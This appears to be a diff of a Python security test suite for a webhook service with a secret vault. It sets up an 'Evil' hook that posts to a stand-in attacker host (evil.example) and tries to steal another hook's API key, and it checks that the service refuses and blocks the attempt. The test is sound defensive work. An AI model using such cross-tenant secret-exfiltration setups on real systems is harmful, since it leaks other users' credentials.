@@ -102,24 +102,24 @@ async def main():
     check("P1: create with a reference to another hook's secret is refused", "cannot be a secret reference" in err, err)
     evil, etok, _ = f.create("/brainB", name="Evil", target="", text="", level="full",
                              actions=[{"id": "x", "kind": "http", "url": "https://evil.example/h", "headers": {"X-K": "own"}}])
-    _, err = f.update(evil["id"], {"actions": [{"id": "x", "kind": "http", "url": "https://evil.example/h",
-                                                "headers": {"X-K": {"$secret": f"{vid}/a/crm/X-Api-Key"}}}]})
+    _, err, _ = f.update(evil["id"], {"actions": [{"id": "x", "kind": "http", "url": "https://evil.example/h",
+                                                   "headers": {"X-K": {"$secret": f"{vid}/a/crm/X-Api-Key"}}}]})
     check("P1: update with a foreign reference is refused", "cannot be a secret reference" in err, err)
-    _, err = f.update(evil["id"], {"verify": {"provider": "github", "secret": {"$secret": f"{vid}/verify"}}})
+    _, err, _ = f.update(evil["id"], {"verify": {"provider": "github", "secret": {"$secret": f"{vid}/verify"}}})
     check("P1: a foreign signing-secret reference is refused", "cannot be a reference" in err, err)
-    # even if a reference were planted in webhooks.json by hand, the run refuses it
-    data = f._load()
-    e = f._find(data, evil["id"])
-    e["actions"][0]["headers"]["X-K"] = {"$secret": f"{vid}/a/crm/X-Api-Key"}
-    f._save(data)
+    # even if a reference were planted in the stored configuration by hand, the run refuses it
+    def plant(hid, fn):
+        row = st._db.execute("SELECT config FROM hooks WHERE id=?", (hid,)).fetchone()
+        cfg = json.loads(row[0])
+        fn(cfg)
+        st._db.execute("UPDATE hooks SET config=? WHERE id=?", (json.dumps(cfg), hid))
+    plant(evil["id"], lambda c: c["actions"][0]["headers"].update({"X-K": {"$secret": f"{vid}/a/crm/X-Api-Key"}}))
     hits.clear()
     code, r = await f.accept(evil["id"], etok, b"{}", "application/json", "steal")
     await f.wait_idle()
-    check("P1: a planted foreign reference is never resolved at run time (nothing sent)", not hits
-          and st.get(r["run_id"])["branches"][0]["status"] == "failed", (hits, st.get(r["run_id"])["branches"]))
-    data = f._load()
-    f._find(data, evil["id"])["actions"][0]["headers"] = {}
-    f._save(data)
+    check("P1: a planted foreign reference is never resolved at run time (nothing sent, the delivery blocked)", not hits
+          and st.get(r["run_id"])["branches"][0]["status"] == "blocked", (hits, st.get(r["run_id"])["branches"]))
+    plant(evil["id"], lambda c: c["actions"][0].update(headers={}))
     f.update(evil["id"], {"actions": [{"id": "x", "kind": "http", "url": "https://evil.example/h"}]})
     check("P1: the victim's secrets are intact (no cross-hook deletion)", f.vault.get(f"{vid}/a/crm/X-Api-Key") == "sk-VICTIM"
           and f.vault.get(f"{vid}/verify") == SEC)
@@ -166,15 +166,14 @@ async def main():
           and st.get(r["run_id"])["branches"][0]["status"] == "approval", st.get(r["run_id"])["branches"])
 
     # P2-5: approve a branch of an event that ended unknown (because of a sibling)
-    data = f._load()
-    hu = f._find(data, ht["id"])
-    st._db.execute("UPDATE branches SET status='approval' WHERE event_id=?", (r["run_id"],))
-    st._db.execute("INSERT INTO branches(event_id, action_id, kind, delivery_id, status, dispatched_at, finished_at)"
-                   " VALUES(?,?,?,?,?,?,?)", (r["run_id"], "crm", "http", "dlv_z", "unknown", time.time(), time.time()))
+    st._db.execute("UPDATE deliveries SET status='approval' WHERE event_id=?", (r["run_id"],))
+    st._db.execute("INSERT INTO deliveries(event_id, action_id, generation, kind, delivery_id, status, dispatched_at,"
+                   " finished_at) VALUES(?,?,1,?,?,?,?,?)", (r["run_id"], "crm", "http", "dlv_z", "unknown", time.time(),
+                                                             time.time()))
     st._db.execute("UPDATE events SET status='unknown' WHERE id=?", (r["run_id"],))
-    hu["actions"].append({"id": "crm", "kind": "http", "url": "https://crm.example/h", "headers": {}, "body": "fields",
-                          "timeout_s": 15.0, "retry": "never", "allow_private": False})
-    f._save(data)
+    plant(ht["id"], lambda c: c["actions"].append({"id": "crm", "kind": "http", "url": "https://crm.example/h",
+                                                   "headers": {}, "body": "fields", "timeout_s": 15.0, "retry": "never",
+                                                   "allow_private": False}))
     ok, why = st.approve(r["run_id"], "pos", "approve")
     check("P2: approving on an event that is unknown requeues it so the approved branch runs", ok
           and st.get(r["run_id"])["status"] == "queued", (ok, why, st.get(r["run_id"])["status"]))
@@ -187,6 +186,7 @@ async def main():
     # P2-6: approve racing the end of a run: settle re-reads the branches
     s2 = ws.Store(Path(tempfile.mkdtemp(prefix="m4r-race-")) / "e.sqlite3")
     c, i = s2.ingest({"id": "wh_r", "brain": "/b"}, b"{}", "", "race")
+    s2.triage_commit(i["event_id"], {"decision": "run"}, [])
     w = s2.claim("W")
     s2.branches_init(w["id"], w["fence"], [{"id": "pos", "kind": "tool"}], wa.delivery_id)
     s2.branch_finish(w["id"], w["fence"], "pos", "approval", "waiting")
